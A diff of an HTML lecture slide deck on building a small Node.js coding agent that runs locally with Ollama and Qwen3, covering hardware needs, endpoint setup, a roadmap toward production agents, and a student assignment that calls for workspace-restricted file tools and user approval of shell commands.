-        <p class="muted" style="text-align:center; margin-top:22px;"><small><b>Ollama</b> = the easiest way to download &amp; run open models · <b>Qwen3</b> (Alibaba) is strong at <b>tool calling</b>, exactly what agents need.</small></p>
+        <p class="muted" style="text-align:center; margin-top:22px;"><small><b>Ollama</b> runs open models locally. <b>Qwen3</b> is strong at <b>tool calling</b>, which agents need.</small></p>
       </section>
 
       <!-- 16-tradeoffs. Local trade-offs -->
       <section>
         <h2>Local trade-offs — be realistic</h2>
-        <p class="muted">Free and private, but not magic. Know what you're giving up:</p>
+        <p class="muted">Free and private, with trade-offs:</p>
         <div class="anat" style="grid-template-columns: repeat(3, 1fr); margin-top: 10px;">
-          <div class="card"><span class="ico">⚙️</span><h3 class="accent2">Hardware</h3><p>Needs decent RAM/GPU — bigger models need more.</p></div>
-          <div class="card"><span class="ico">📉</span><h3 class="accent2">Capability</h3><p>Small local models trail frontier cloud models a bit.</p></div>
-          <div class="card"><span class="ico">🔧</span><h3 class="accent2">Maintenance</h3><p>You manage the models and updates yourself.</p></div>
+          <div class="card"><span class="ico">⚙️</span><h3 class="accent2">Hardware</h3><p>Bigger models need more RAM/GPU.</p></div>
+          <div class="card"><span class="ico">📉</span><h3 class="accent2">Capability</h3><p>Small models trail frontier cloud models.</p></div>
+          <div class="card"><span class="ico">🔧</span><h3 class="accent2">Maintenance</h3><p>You manage models and updates.</p></div>
         </div>
-        <blockquote style="margin-top:22px;">Good news: for <b>learning</b> and everyday coding tasks, a local <b>Qwen3</b> is more than enough — and you can always fall back to a cloud API for the hardest jobs.</blockquote>
+        <blockquote style="margin-top:22px;">For <b>learning</b> and everyday coding tasks, local <b>Qwen3</b> is enough. Use cloud APIs for harder jobs.</blockquote>
       </section>
 
       <!-- 16b. Free models compared + why Qwen3 -->
@@ -1017,10 +1017,10 @@ Done:                      // ← when to stop calling tools
           <div class="card">
             <h3 class="good">Why Qwen3 for this demo</h3>
             <ul style="font-size:0.72em;">
-              <li><b>Strong, reliable tool calling</b> for a local model — rarely malforms tool JSON</li>
-              <li><b>Fits modest laptops</b> — 4B ≈ ~3 GB RAM, runs on almost any machine</li>
-              <li>Solid at <b>code + reasoning</b>, many sizes (0.6B → 32B)</li>
-              <li>Uses the <b>OpenAI-compatible</b> endpoint → <span class="accent">zero code change</span></li>
+              <li><b>Reliable tool calling</b> for a local model</li>
+              <li><b>Fits modest laptops</b> — 4B ≈ ~3 GB RAM</li>
+              <li>Solid at <b>code + reasoning</b>; many sizes</li>
+              <li><b>OpenAI-compatible</b> endpoint → <span class="accent">minimal code change</span></li>
             </ul>
           </div>
         </div>
@@ -1029,7 +1029,7 @@ Done:                      // ← when to stop calling tools
       <!-- 16c. Hardware requirements -->
       <section>
         <h2>What hardware do you actually need?</h2>
-        <p class="muted">Rough rule of thumb at <b>Q4</b>: <b class="accent">RAM ≈ model size (B) × ~0.7 GB</b>. No GPU required — CPU / Apple Silicon just runs slower.</p>
+        <p class="muted">Rule of thumb at <b>Q4</b>: <b class="accent">RAM ≈ model size (B) × ~0.7 GB</b>. GPU helps speed, not correctness.</p>
         <table style="font-size:0.6em; margin-top:14px;">
           <thead><tr><th>Model</th><th>RAM / VRAM (Q4)</th><th>Runs comfortably on</th><th>Feel</th></tr></thead>
           <tbody>
@@ -1040,9 +1040,9 @@ Done:                      // ← when to stop calling tools
           </tbody>
         </table>
         <div class="cols3" style="margin-top:18px;">
-          <div class="card"><h3>GPU = speed</h3><p><small>A GPU mainly makes it <b>faster</b>, not smarter. CPU works, just fewer tokens/sec.</small></p></div>
-          <div class="card"><h3 class="accent2">Apple Silicon shines</h3><p><small>Unified memory lets M-series Macs run 8–14B models smoothly.</small></p></div>
-          <div class="card"><h3 class="good">Start small</h3><p><small>Begin at 4B; only size up (8B+) if the answers aren't good enough.</small></p></div>
+          <div class="card"><h3>GPU = speed</h3><p><small>CPU works, just fewer tokens/sec.</small></p></div>
+          <div class="card"><h3 class="accent2">Apple Silicon shines</h3><p><small>Unified memory helps 8–14B models run smoothly.</small></p></div>
+          <div class="card"><h3 class="good">Start small</h3><p><small>Begin at 4B; size up only if needed.</small></p></div>
         </div>
         <aside class="notes">Numbers are approximate for Q4_K_M. Context length also eats RAM (the KV cache) — long contexts add up.</aside>
       </section>
@@ -1071,7 +1071,7 @@ brew install ollama</code></pre>
 #   http://localhost:11434
 # (the desktop app starts it automatically;
 #  otherwise run:  ollama serve )</code></pre>
-            <p class="muted"><small>That local server is what your Node agent will talk to.</small></p>
+            <p class="muted"><small>Your Node agent talks to this local server.</small></p>
           </div>
         </div>
       </section>
@@ -1106,19 +1106,19 @@ ollama pull qwen3:32b      # best quality, needs ~32 GB / good GPU</code></pre>
       <!-- 19. openai compatible endpoint -->
       <section>
         <h2>Step 3 — Ollama speaks "OpenAI"</h2>
-        <p>Ollama exposes an <b class="accent">OpenAI-compatible API</b>, so your existing OpenAI SDK code works — just change the <code>baseURL</code>.</p>
+        <p>Ollama exposes an <b class="accent">OpenAI-compatible API</b>. Change <code>baseURL</code>; keep the loop.</p>
         <pre><code data-trim data-noescape class="language-bash"># quick test with plain curl:
 curl http://localhost:11434/v1/chat/completions -d '{
   "model": "qwen3:4b",
   "messages": [{ "role": "user", "content": "Say hi in 3 words" }]
 }'</code></pre>
-        <p class="muted"><small>Same request shape as OpenAI → same SDK → same agent loop. No rewrite needed.</small></p>
+        <p class="muted"><small>Same request shape → same SDK → same agent loop.</small></p>
       </section>
 
       <!-- 20. point agent at ollama -->
       <section>
         <h2>Step 4 — Point your agent at Qwen3</h2>
-        <p>Remember our agent from Part 2? Change <span class="accent2">two lines</span> and it's now 100% local &amp; free:</p>
+        <p>Change <span class="accent2">two lines</span> and the Part 2 agent runs locally:</p>
         <pre><code data-trim data-noescape class="language-javascript">import OpenAI from "openai";
 
 const openai = new OpenAI({
@@ -1132,19 +1132,19 @@ const res = await openai.chat.completions.create({
   messages,
   tools,                                 // Qwen3 supports tool calling
 });</code></pre>
-        <p class="good">Same 80-line agent. Zero cost. Nothing leaves your machine.</p>
-        <aside class="notes">Demo runs on Qwen3 4B — light and fast, and it handles tool calls well for this small agent. If tool-calling ever feels flaky, use a recent Ollama version and bump to 8B+. Keep tools few and descriptions crisp.</aside>
+        <p class="good">Same 80-line agent. Local, free per token, private.</p>
+        <aside class="notes">Demo runs on Qwen3 4B: light, fast, and good enough for this small agent. If tool-calling feels flaky, use a recent Ollama version, bump to 8B+, and keep tools few with crisp descriptions.</aside>
       </section>
 
       <!-- 21. recap -->
       <section>
         <h2>Recap — the mental model</h2>
         <ul style="list-style:none; margin-left:0; padding-left:0;">
-          <li><span style="margin-right:10px;">🧠</span><b class="accent">LLM</b> = a next-token predictor trained at massive scale.</li>
+          <li><span style="margin-right:10px;">🧠</span><b class="accent">LLM</b> = next-token predictor at scale.</li>
           <li><span style="margin-right:10px;">🤖</span><b class="accent">Agent</b> = LLM + <b>tools</b> + a <b>loop</b> + a <b>goal</b>.</li>
-          <li><span style="margin-right:10px;">🔁</span>The loop: <span class="muted">think → (tool call) → act → observe → repeat → answer.</span></li>
-          <li><span style="margin-right:10px;">💻</span>In Node.js it's ~80 lines: define tools, run the loop, feed results back.</li>
-          <li><span style="margin-right:10px;">🔀</span>Swap cloud ↔ local by changing the <code>baseURL</code> and <code>model</code> — the logic never changes.</li>
+          <li><span style="margin-right:10px;">🔁</span>Loop: <span class="muted">think → tool → act → observe → repeat → answer.</span></li>
+          <li><span style="margin-right:10px;">💻</span>Node.js MVP: tools + loop + tool results.</li>
+          <li><span style="margin-right:10px;">🔀</span>Cloud ↔ local: change <code>baseURL</code> and <code>model</code>.</li>
           <li><span style="margin-right:10px;">🖥️</span><b class="good">Ollama + Qwen3</b> = the same agent, free, private, offline.</li>
         </ul>
       </section>
@@ -1152,7 +1152,7 @@ const res = await openai.chat.completions.create({
       <!-- 21b. secret sauce (techniques) -->
       <section>
         <h2>The "secret sauce" of great agents</h2>
-        <p class="muted">Our small loop works. Here's what tools like Claude Code add to make it <i>reliable</i>:</p>
+        <p class="muted">Our loop works. Production agents add reliability layers:</p>
         <div class="anat" style="grid-template-columns: repeat(3, 1fr); margin-top:8px;">
           <div class="card"><span class="ico">🧭</span><h3 class="accent">Context engineering</h3></div>
           <div class="card"><span class="ico">🧩</span><h3 class="accent">MCP tools</h3></div>
@@ -1168,7 +1168,7 @@ const res = await openai.chat.completions.create({
       <!-- 21c. roadmap to Claude Code -->
       <section>
         <h2>Roadmap — from mini-agent to "Claude Code"</h2>
-        <p class="muted">Level up the same loop one layer at a time:</p>
+        <p class="muted">Level up the same loop, one layer at a time:</p>
         <div class="loop" style="font-family: Inter, system-ui, sans-serif; line-height: 2.05;">
           <span class="step">1.</span> <span style="margin:0 6px;">🏗️</span><b>MVP loop</b> — read · write · run · the while-loop&nbsp;&nbsp;<span class="good">← you built this</span><br/>
           <span class="step">2.</span> <span style="margin:0 6px;">🔧</span><b>Better tools</b> — edit (str-replace) · grep · glob · git · <b class="accent">MCP servers</b><br/>
@@ -1177,17 +1177,17 @@ const res = await openai.chat.completions.create({
           <span class="step">5.</span> <span style="margin:0 6px;">🎨</span><b>UX</b> — streaming · TUI with diffs · <b class="accent">Markdown render</b> · sessions &amp; memory<br/>
           <span class="accent2" style="font-size:1.2em;">➜</span> <b class="good">A Claude Code–class agent</b> 🎉
         </div>
-        <p class="muted"><small>Every layer is optional and additive — the core loop never changes. Study real ones: <b>Claude Code</b>, Aider, Cline.</small></p>
+        <p class="muted"><small>Layers are additive; the core loop stays the same. Study: <b>Claude Code</b>, Aider, Cline.</small></p>
       </section>
 
       <!-- 22. next steps + resources -->
       <section>
         <h2>Where to go next</h2>
-        <p class="muted">You have the whole mental model — now make it yours. Three things to try tonight:</p>
+        <p class="muted">You have the mental model. Try three things tonight:</p>
         <div class="anat" style="grid-template-columns: repeat(3, 1fr); margin-top:8px;">
-          <div class="card"><span class="ico">🔑</span><h3 class="good">Build it</h3><p>Run the agent with your own API key and give it a real task.</p></div>
-          <div class="card"><span class="ico">🔌</span><h3 class="good">Go offline</h3><p>Point <code>baseURL</code> at Qwen3 on Ollama — zero cost, fully local.</p></div>
-          <div class="card"><span class="ico">🛠️</span><h3 class="good">Extend it</h3><p>Add one tool: <code>git</code>, web search, or line-level edit.</p></div>
+          <div class="card"><span class="ico">🔑</span><h3 class="good">Build it</h3><p>Run the agent with your own API key.</p></div>
+          <div class="card"><span class="ico">🔌</span><h3 class="good">Go offline</h3><p>Point <code>baseURL</code> at Qwen3 on Ollama.</p></div>
+          <div class="card"><span class="ico">🛠️</span><h3 class="good">Extend it</h3><p>Add one tool: <code>git</code>, search, or line edit.</p></div>
         </div>
         <div class="cols" style="margin-top:20px; gap:22px;">
           <div class="card">
@@ -1196,7 +1196,7 @@ const res = await openai.chat.completions.create({
           </div>
           <div class="card">
             <h3 class="accent">🔍 Study real agents</h3>
-            <p><small><b>Claude Code</b> · Aider · Cline · OpenCode — read their loops, steal their ideas.</small></p>
+            <p><small><b>Claude Code</b> · Aider · Cline · OpenCode — study their loops.</small></p>
           </div>
         </div>
       </section>
@@ -1209,10 +1209,10 @@ const res = await openai.chat.completions.create({
           <div class="card">
             <h3 class="good">Core requirements</h3>
             <ul style="font-size:0.82em;">
-              <li>A <b>CLI tool</b> — chat with the agent in the terminal</li>
+              <li><b>CLI tool</b> — chat in the terminal</li>
               <li>Powered by <b>Ollama + Qwen3</b> (local)</li>
-              <li>Switch model via <b><code>config.json</code></b> — no code change</li>
-              <li><b>Run &amp; demo</b> on your own machine</li>
+              <li>Switch model via <b><code>config.json</code></b></li>
+              <li><b>Run &amp; demo</b> locally</li>
             </ul>
             <pre style="font-size:0.38em; margin:6px 0 0;"><code data-trim data-noescape class="language-json">{
   "provider": "ollama",
@@ -1224,11 +1224,11 @@ const res = await openai.chat.completions.create({
           <div class="card">
             <h3 class="accent">Tools to implement</h3>
             <ul style="font-size:0.74em;">
-              <li><b>File (main):</b> <code>read_file</code> · <code>write_file</code> · <code>list_files</code> · <code>edit_file</code> · <code>create_dir</code> · <code>delete_file</code><br/>
-                <span class="muted" style="font-size:0.9em;">↳ must stay <b>inside the workspace folder</b> — block <code>..</code> / paths that escape it</span></li>
+              <li><b>File:</b> <code>read_file</code> · <code>write_file</code> · <code>list_files</code> · <code>edit_file</code> · <code>create_dir</code> · <code>delete_file</code><br/>
+                <span class="muted" style="font-size:0.9em;">↳ stay <b>inside workspace</b>; block escaping paths</span></li>
               <li><b><code>run_command</code></b> — run a shell command<br/>
-                <span class="muted" style="font-size:0.9em;">↳ <b>ask the user to approve</b> before running</span></li>
-              <li><b>Session</b> — keep the conversation <b>in memory</b> across turns</li>
+                <span class="muted" style="font-size:0.9em;">↳ <b>ask approval</b> before running</span></li>
+              <li><b>Session</b> — keep conversation <b>in memory</b></li>
             </ul>
           </div>
         </div>
@@ -1242,7 +1242,7 @@ const res = await openai.chat.completions.create({
           <div class="card">
             <h3 class="accent">Demo &amp; submit</h3>
             <ul style="font-size:0.82em;">
-              <li>🎥 Record a short demo, upload to <b>YouTube</b></li>
+              <li>🎥 Record a short <b>YouTube</b> demo</li>
               <li>📤 Submit the <b>YouTube link</b> + <b>source code</b> on <b>Moodle</b></li>
             </ul>
           </div>
@@ -1251,7 +1251,7 @@ const res = await openai.chat.completions.create({
             <ul style="font-size:0.82em;">
               <li><b>Any</b> programming language</li>
               <li>AI coding assistants <b>allowed</b></li>
-              <li>Free tiers / <b>local models</b> allowed (e.g. Ollama&nbsp;+&nbsp;Qwen3, or a provider free tier)</li>
+              <li>Free tiers / <b>local models</b> allowed</li>
             </ul>
           </div>
           <div class="card">
@@ -1302,14 +1302,14 @@ const res = await openai.chat.completions.create({
           <h3 class="accent" style="font-size:0.8em; margin:0 0 4px;"><span style="margin-right:6px;">🔍</span>Real agents to study</h3>
           <p style="font-size:0.52em; margin:0;"><b>Claude Code</b> · claude.com/claude-code &nbsp;·&nbsp; <b>Aider</b> · aider.chat &nbsp;·&nbsp; <b>Cline</b> · github.com/cline/cline &nbsp;·&nbsp; <b>OpenCode</b> · opencode.ai</p>
         </div>
-        <p class="muted" style="text-align:center; margin-top:10px;"><small>Model names &amp; prices are approximate (~mid-2026) — verify on each provider's official docs.</small></p>
+        <p class="muted" style="text-align:center; margin-top:10px;"><small>Model names &amp; prices change — verify on official docs before class.</small></p>
       </section>
 
       <!-- 23. THANK YOU -->
       <section class="title" data-background-color="#0f1319">
         <div class="kicker">That's a wrap</div>
-        <h1>Now go build one 🚀</h1>
-        <p class="muted">LLM → Agent → Node.js → Ollama + Qwen3. You have everything you need.</p>
+        <h1>Now go build one <span style="-webkit-text-fill-color: initial; background: none;">🚀</span></h1>
+        <p class="muted">LLM → Agent → Node.js → Ollama + Qwen3.</p>
         <p><span class="pill">Questions?</span></p>
         <div class="author">
           <strong>Kha Do</strong> · FIT-HCMUS · <span class="accent">dnkha@fit.hcmus.edu.vn</span>
